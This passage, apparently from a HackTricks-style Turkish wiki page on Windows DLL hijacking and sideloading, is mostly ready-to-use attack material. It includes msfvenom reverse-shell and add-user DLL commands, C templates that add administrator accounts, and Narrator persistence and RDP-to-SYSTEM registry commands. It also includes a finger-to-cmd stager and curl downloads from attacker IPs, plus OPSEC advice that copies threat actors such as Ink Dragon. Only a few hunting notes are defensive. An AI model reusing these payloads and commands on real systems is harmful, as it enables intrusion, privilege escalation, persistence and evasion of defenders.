**Bir meterpreter (x86) elde edin:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Bir kullanıcı oluştur (x86; x64 sürümünü görmedim):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Kendininki

Çoğu durumda derlediğiniz DLL, **kurban süreç tarafından içe aktarılan tüm işlevleri dışa aktarmalıdır**. Gerekli bir dışa aktarma eksikse ikili dosya bu işlevi çözümlenemediğinden exploit başarısız olur.

<details>
<summary>C DLL şablonu (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Kullanıcı oluşturma içeren C++ DLL örneği</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Thread giriş noktası içeren alternatif C DLL'i</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başlangıçta hâlâ tahmin edilebilir, dile özgü bir localization DLL'i yoklar; bu DLL hijack edilerek arbitrary code execution ve persistence sağlanabilir.<sup>[[7]](#references)</sup>

Temel bilgiler
- Yoklama yolu (güncel derlemeler): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Eski yol (önceki derlemeler): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore yolunda saldırganın kontrol ettiği yazılabilir bir DLL varsa yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalışır. Export gerekmez.

Procmon ile keşif
- Filtre: `Process Name is Narrator.exe` ve `Operation is Load Image` veya `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki yol için yapılan yükleme denemesini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC sessizliği
- Naif bir hijack işlemi konuşma/sesli UI çıktısı üretir. Sessiz kalmak için attach sırasında Narrator thread'lerini listeleyin, ana thread'i (`OpenThread(THREAD_SUSPEND_RESUME)`) açıp `SuspendThread` ile askıya alın; kendi thread'inizde devam edin. Tam kod için PoC'ye bakın.<sup>[[8]](#references)</sup>

Accessibility yapılandırması üzerinden tetikleme ve kalıcılık
- Kullanıcı bağlamı (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle Narrator başlatıldığında yerleştirilen DLL yüklenir. Güvenli masaüstünde (oturum açma ekranında), Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'niz güvenli masaüstünde SYSTEM olarak çalışır.

RDP ile tetiklenen SYSTEM çalıştırması (yatay hareket)
- Klasik RDP güvenlik katmanını etkinleştirin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Ana makineye RDP ile bağlanın ve oturum açma ekranında Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'niz güvenli masaüstünde SYSTEM olarak çalışır.
- RDP oturumu kapandığında çalıştırma durur—hemen inject/migrate edin.

Kendi Accessibility aracınızı getirin (BYOA)
- Yerleşik bir Accessibility Tool (AT) kayıt defteri girdisini (ör. CursorIndicator) klonlayabilir, rastgele bir binary/DLL'ye işaret edecek şekilde düzenleyip içe aktarabilir, ardından `configuration` değerini bu AT adını kullanacak şekilde ayarlayabilirsiniz. Bu yöntem, Accessibility framework'ü altında rastgele çalıştırmaları proxy'ler.

Notlar
- `%windir%\System32` dizinine yazmak ve HKLM değerlerini değiştirmek için admin hakları gerekir.
- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde bulunabilir; export gerekmez.

## Vaka İncelemesi: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Yetki Yükseltme

Bu vaka, Lenovo'nun TrackPoint Quick Menu'sündeki (`TPQMAssistant.exe`) **Phantom DLL Hijacking** tekniğini ele alır; bu teknik **CVE-2025-1729** olarak izlenmektedir.<sup>[[2]](#references)[[3]](#references)</sup>

### Zafiyet Ayrıntıları

- **Bileşen**: `C:\ProgramData\Lenovo\TPQM\Assistant\` konumundaki `TPQMAssistant.exe`.
- **Zamanlanmış Görev**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`, her gün 9:30 AM'de oturum açmış kullanıcının bağlamında çalışır.
- **Dizin İzinleri**: `CREATOR OWNER` tarafından yazılabilir; bu da yerel kullanıcıların rastgele dosyalar bırakmasına olanak tanır.
- **DLL Arama Davranışı**: Önce çalışma dizininden `hostfxr.dll` yüklemeye çalışır ve dosya yoksa "NAME NOT FOUND" kaydını oluşturur; bu da yerel dizin aramasının öncelikli olduğunu gösterir.

### Exploit Uygulaması

Bir saldırgan, kullanıcının bağlamında kod çalıştırmak için eksik DLL'den yararlanarak aynı dizine kötü amaçlı bir `hostfxr.dll` stub'ı yerleştirebilir:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Saldırı Akışı

1. Standart kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin mevcut kullanıcının bağlamında 9:30 AM'de çalışmasını bekleyin.
3. Görev çalıştığında bir yönetici oturum açmışsa, kötü amaçlı DLL yöneticinin oturumunda orta bütünlük düzeyinde çalışır.
4. Orta bütünlük düzeyinden SYSTEM ayrıcalıklarına yükselmek için standart UAC bypass tekniklerini zincirleyin.

## Vaka İncelemesi: MSI CustomAction Dropper + İmzalı Host Üzerinden DLL Side-Loading (wsc_proxy.exe)

Tehdit aktörleri, payload'ları güvenilir ve imzalı bir süreç altında çalıştırmak için MSI tabanlı dropper'ları sık sık DLL side-loading ile birlikte kullanır.<sup>[[10]](#references)</sup>

Zincire genel bakış
- Kullanıcı MSI dosyasını indirir. GUI kurulum sırasında bir CustomAction sessizce çalışır (ör. LaunchApplication veya bir VBScript eylemi) ve sonraki aşamayı gömülü kaynaklardan yeniden oluşturur.
- Dropper, meşru ve imzalı bir EXE ile kötü amaçlı bir DLL'yi aynı dizine yazar (örnek çift: Avast imzalı wsc_proxy.exe + saldırganın kontrolündeki wsc.dll).
- İmzalı EXE başlatıldığında, Windows DLL arama sırası önce çalışma dizinindeki wsc.dll dosyasını yükleyerek saldırgan kodunu imzalı bir üst süreç altında çalıştırır (ATT&CK T1574.001).

MSI analizi (nelere bakılmalı)
- CustomAction tablosu:
  - Yürütülebilir dosyaları veya VBScript'i çalıştıran girdileri arayın. Şüpheli bir örüntü: arka planda gömülü bir dosyayı çalıştıran LaunchApplication.
  - Orca'da (Microsoft Orca.exe) CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki gömülü/bölünmüş payload'lar:
  - Yönetimsel çıkarma: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Veya lessmsi kullanın: lessmsi x package.msi C:\out
  - VBScript CustomAction tarafından birleştirilip şifresi çözülen birden fazla küçük parçayı arayın. Yaygın akış:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre koyun:
  - wsc_proxy.exe: Meşru, imzalı bir host (Avast). İşlem, bulunduğu dizinde wsc.dll dosyasını ada göre yüklemeye çalışır.
  - wsc.dll: Saldırganın DLL’i. Belirli export’lar gerekmiyorsa DllMain yeterli olabilir; aksi takdirde, gerekli export’ları gerçek kütüphaneye yönlendirirken DllMain içinde payload çalıştıran bir proxy DLL oluşturun.
- Minimal bir DLL payload’ı oluşturun:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Export gereksinimleri için, payload’unuzu da çalıştıran bir forwarding DLL oluşturmak üzere bir proxying framework (ör. DLLirant/Spartacus) kullanın.

- Bu teknik, DLL ad çözümlemesinin host binary tarafından yapılmasına dayanır. Host mutlak yollar veya güvenli yükleme bayrakları (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded export’lar öncelik sırasını etkileyebilir; host binary’yi ve export setini seçerken bunları göz önünde bulundurun.

## İmzalı triadlar + şifrelenmiş payload’lar (ShadowPad vaka çalışması)

Check Point, Ink Dragon’ın ShadowPad’i, temel payload’u diskte şifreli tutarken meşru yazılımların arasına gizlenmek için **üç dosyalı bir triad** kullanarak dağıttığını açıkladı:<sup>[[12]](#references)</sup>

1. **İmzalı host EXE** – AMD, Realtek veya NVIDIA gibi tedarikçilerin dosyaları kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar, Authenticode imzası geçerliliğini korurken yürütülebilir dosyanın adını Windows binary’si gibi görünecek şekilde değiştirir (örneğin `conhost.exe`).
2. **Kötü amaçlı loader DLL** – EXE’nin yanına beklenen adla bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework’üyle obfuscate edilmiş bir MFC binary’sidir; tek görevi şifrelenmiş blob’u bulmak, şifresini çözmek ve ShadowPad’i reflective olarak map etmektir.
3. **Şifrelenmiş payload blob’u** – Genellikle aynı dizinde `<name>.tmp` olarak saklanır. Şifresi çözülmüş payload belleğe map edildikten sonra loader, adli kanıtları yok etmek için TMP dosyasını siler.

Tradecraft notları:

* İmzalı EXE’nin adını değiştirip PE header’daki özgün `OriginalFileName` değerini korumak, tedarikçi imzasını geçerli tutarken dosyanın Windows binary’si gibi görünmesini sağlar. Bu nedenle Ink Dragon’ın `conhost.exe` gibi görünen, ancak aslında AMD/NVIDIA yardımcı programları olan binary’leri bırakma alışkanlığını taklit edin.
* Yürütülebilir dosya güvenilir kaldığından, çoğu allowlisting denetimi için kötü amaçlı DLL’nizin onun yanında bulunması yeterlidir. Loader DLL’yi özelleştirmeye odaklanın; imzalı üst süreç genellikle değiştirilmeden çalıştırılabilir.
* ShadowPad’in decryptor’ı, TMP blob’unun loader’ın yanında bulunmasını ve map işleminden sonra dosyayı sıfırlayabilmek için yazılabilir olmasını bekler. Payload yüklenene kadar dizini yazılabilir tutun; belleğe alındıktan sonra OPSEC için TMP dosyası güvenle silinebilir.

### LOLBAS stager + aşamalı arşiv sideloading zinciri (finger → tar/curl → WMI)

Operatörler, diskteki tek özel yapıtın güvenilir EXE’nin yanındaki kötü amaçlı DLL olmasını sağlamak için DLL sideloading’i LOLBAS ile birlikte kullanır:<sup>[[1]](#references)</sup>

- **Uzak komut yükleyici (Finger):** Gizli PowerShell, `cmd.exe /c` başlatır, komutları bir Finger sunucusundan alır ve `cmd`'ye pipe eder:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host`, TCP/79 üzerinden metin çeker; `| cmd` sunucu yanıtını çalıştırır ve operatörlerin ikinci aşama sunucusunu sunucu tarafında değiştirmesine olanak tanır.

- **Yerleşik indirme/çıkarma:** Arşivi zararsız bir uzantıyla indirin, açın ve sideload hedefini DLL ile birlikte rastgele bir `%LocalAppData%` klasörüne yerleştirin:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ilerleme bilgilerini gizler ve yönlendirmeleri izler; `tar -xf` Windows'un yerleşik tar aracını kullanır.

- **WMI/CIM ile başlatma:** EXE'yi WMI üzerinden başlatın; böylece colocated DLL'yi yüklerken telemetride CIM tarafından oluşturulan bir işlem görünür:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Yerel DLL'leri tercih eden binary'lerle çalışır (örn. `intelbq.exe`, `nearby_share.exe`); payload (örn. Remcos), güvenilir ad altında çalışır.

- **Avlama:** `/p`, `/m` ve `/c` seçenekleri birlikte geçtiğinde `forfiles` için uyarı oluşturun; yönetici script'leri dışında bu kullanım yaygın değildir.


## Vaka İncelemesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın zamanda gerçekleşen bir Lotus Blossom saldırısı, NSIS ile paketlenmiş bir dropper dağıtmak için güvenilir bir güncelleme zincirini kötüye kullandı. Dropper, bir DLL sideload ve tamamen bellekte çalışan payload'lar hazırladı.<sup>[[13]](#references)</sup>

Operasyon akışı
- `update.exe` (NSIS), `%AppData%\Bluetooth` dizinini oluşturur, **HIDDEN** olarak işaretler, yeniden adlandırılmış bir Bitdefender Submission Wizard `BluetoothService.exe`, kötü amaçlı bir `log.dll` ve şifrelenmiş bir `BluetoothService` blob'u bırakır; ardından EXE'yi başlatır.
- Ana bilgisayar EXE'si `log.dll` dosyasını import eder ve `LogInit`/`LogWrite` işlevlerini çağırır. `LogInit`, blob'u mmap ile yükler; `LogWrite`, özel bir LCG tabanlı akışla şifresini çözer (sabitler **0x19660D** / **0x3C6EF35F**, anahtar malzemesi önceki bir hash'ten türetilir), buffer'ın üzerine düz metin shellcode yazar, geçici verileri serbest bırakır ve shellcode'a atlar.
- IAT kullanmamak için loader, export adlarını **FNV-1a basis 0x811C9DC5 + prime 0x1000193** kullanarak hash'ler, ardından Murmur tarzı bir avalanche (**0x85EBCA6B**) uygular ve sonuçları salt eklenmiş hedef hash'lerle karşılaştırır.

Ana shellcode (Chrysalis)
- Ana modüle benzeyen PE'nin şifresini beş geçişte tekrarlanan add/XOR/sub işlemleriyle `gQ2JR&9;` anahtarını kullanarak çözer; ardından import çözümlemesini tamamlamak için `Kernel32.dll` → `GetProcAddress` işlevini dinamik olarak yükler.
- DLL adı dizelerini çalışma zamanında, karakter başına bit döndürme/XOR dönüşümleriyle yeniden oluşturur; ardından `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` dosyalarını yükler.
- İkinci bir resolver, **PEB → InMemoryOrderModuleList** zincirini izler, her export tablosunu 4 baytlık bloklar halinde Murmur tarzı karıştırma ile işler ve yalnızca hash bulunamazsa `GetProcAddress` işlevine başvurur.

Gömülü yapılandırma ve C2
- Yapılandırma, bırakılan `BluetoothService` dosyasının içindeki **offset 0x30808** konumunda bulunur (boyut **0x980**) ve RC4 ile `qwhvb^435h&*7` anahtarı kullanılarak çözülür; böylece C2 URL'si ve User-Agent ortaya çıkar.
- Beacon'lar noktayla ayrılmış bir host profili oluşturur, başına `4Q` etiketi ekler, ardından HTTPS üzerinden `HttpSendRequestA` çağrısı yapmadan önce `vAuig34%^325hGV` anahtarıyla RC4 şifrelemesi uygular. Yanıtların RC4 şifresi çözülür ve bir etiket switch'iyle dağıtılır (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + parçalı aktarım durumları).
- Çalıştırma modu CLI argümanlarına bağlıdır: argüman yoksa `-i` seçeneğine işaret eden kalıcılık (service/Run key) yüklenir; `-i` kendisini `-k` ile yeniden başlatır; `-k` kurulumu atlar ve payload'ı çalıştırır.

Gözlemlenen alternatif loader
- Aynı saldırı Tiny C Compiler'ı bıraktı ve `C:\ProgramData\USOShared\` dizinindeki `svchost.exe -nostdlib -run conf.c` komutunu, yanında `libtcc.dll` olacak şekilde çalıştırdı. Saldırganın sağladığı C kaynak kodu shellcode içeriyordu; derlenip, PE'yi diske yazmadan bellekte çalıştırıldı. Şunu kullanarak tekrarlayın:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Bu TCC tabanlı derleme ve çalıştırma aşaması, `Wininet.dll` dosyasını çalışma zamanında içe aktarıp sabit kodlanmış bir URL’den ikinci aşama shellcode’unu çekerek derleyici çalıştırması gibi görünen esnek bir loader sağladı.

## Signed-host sideloading with export proxying + host thread parking

Bazı DLL sideloading zincirleri, meşru ana bilgisayarın zararlı DLL yüklendikten sonra çökmesi yerine sonraki aşamaları sorunsuzca yükleyebilecek kadar uzun süre çalışmasını sağlamak için **kararlılık mühendisliği** ekler.<sup>[[11]](#references)</sup>

Gözlemlenen örüntü
- Güvenilir bir EXE’yi, `version.dll` gibi beklenen bağımlılık adını kullanan zararlı bir DLL’nin yanına bırakın.
- Zararlı DLL, içe aktarma çözümlemesinin başarılı olması ve ana bilgisayar sürecinin çalışmaya devam etmesi için beklenen tüm export’ları gerçek sistem DLL’sine (örneğin `%SystemRoot%\\System32\\version.dll`) **proxy eder**.
- DLL yüklendikten sonra, ana thread’in süreçten çıkması veya süreci sonlandıracak kod yollarını çalıştırması yerine sonsuz bir `Sleep` döngüsüne girmesi için zararlı DLL ana bilgisayarın giriş noktasına **yama uygular**.
- Yeni bir thread gerçek zararlı işi yapar: sonraki aşama DLL’sinin adını veya yolunu çözer (RC4/XOR yaygındır), ardından `LoadLibrary` ile DLL’yi başlatır.

Bunun önemi
- Normal DLL proxying, API uyumluluğunu korur ancak ana bilgisayarın sonraki aşamaların yüklenmesine yetecek kadar uzun süre çalışmasını garanti etmez.
- Ana thread’i `Sleep(INFINITE)` içinde bekletmek, loader başka bir worker thread’de çözme, aşamalandırma veya ağ önyüklemesi yaparken imzalı süreci bellekte tutmanın basit bir yoludur.
- Yalnızca şüpheli bir `DllMain` arayanlar, ilginç davranış ana bilgisayarın giriş noktasına yama uygulandıktan ve ikincil bir thread başlatıldıktan sonra gerçekleşiyorsa bu örüntüyü gözden kaçırabilir.

Asgari iş akışı
1. İmzalı ana bilgisayar EXE’sini kopyalayın ve yerel dizinden hangi DLL’yi yüklediğini belirleyin.
2. Aynı işlevleri export edip meşru DLL’ye yönlendiren bir proxy DLL oluşturun.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir worker thread oluşturun.
4. Bu thread’de, `Sleep` döngüsüne girmesi için ana bilgisayarın giriş noktasına veya ana thread’in başlangıç rutinine yama uygulayın.
5. Sonraki aşama DLL’sinin adını/yapılandırmasını çözün ve `LoadLibrary` çağırın ya da payload’u manual-map yöntemiyle belleğe yükleyin.

Savunma amaçlı inceleme noktaları
- `version.dll` veya benzeri yaygın kütüphaneleri `System32` yerine kendi uygulama dizinlerinden yükleyen imzalı süreçler.
- Görüntü yüklendikten kısa süre sonra süreç giriş noktasına uygulanan bellek yamaları; özellikle `Sleep`/`SleepEx` işlevlerine yönlendirilen jump/call talimatları.
- Proxy DLL tarafından oluşturulup çözümlenmiş bir adla ikinci bir DLL üzerinde hemen `LoadLibrary` çağıran thread’ler.
- `ProgramData`, `%TEMP%` veya arşivden çıkarılmış yollar gibi yazılabilir hazırlık dizinlerinde satıcı yürütülebilir dosyalarının yanına yerleştirilmiş, tüm export’ları proxy eden DLL’ler.

## References

- [1] [Red Canary – İstihbarat İçgörüleri: Ocak 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Ayrıcalık Yükseltme](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows’ta DLL hijacking. Basit bir C örneği.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore, Avrupa’yı Hedef Alan Yeni Zararlı Yazılımı Dağıtıyor](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijack’leri Windows Yardımcılarıyla Buluştuğunda](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Dijital Doppelgänger’lar: Gh0st RAT Dağıtan Gelişen Kimliğe Bürünme Kampanyalarının Anatomisi](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Çıkarların Kesişmesi: Güneydoğu Asya’daki Bir Hükümeti Hedef Alan Tehdit Kümelerinin Analizi](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon’ın İç Yüzü: Gizli Bir Saldırı Operasyonunun Aktarma Ağını ve İşleyişini Ortaya Çıkarmak](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom’ın Araç Setine Derinlemesine Bakış](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack zinciri](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – İranlı APT Screening Serpens’in 2026 Casusluk Kampanyalarını İzleme](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Hızlı ve Öfkeli: İran Çatışması Sırasında Nimbus Manticore Operasyonları](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Görev Eylemleri](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062, Güneydoğu Asya Hükümetlerini ve Kritik Altyapıyı Hedef Alıyor](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
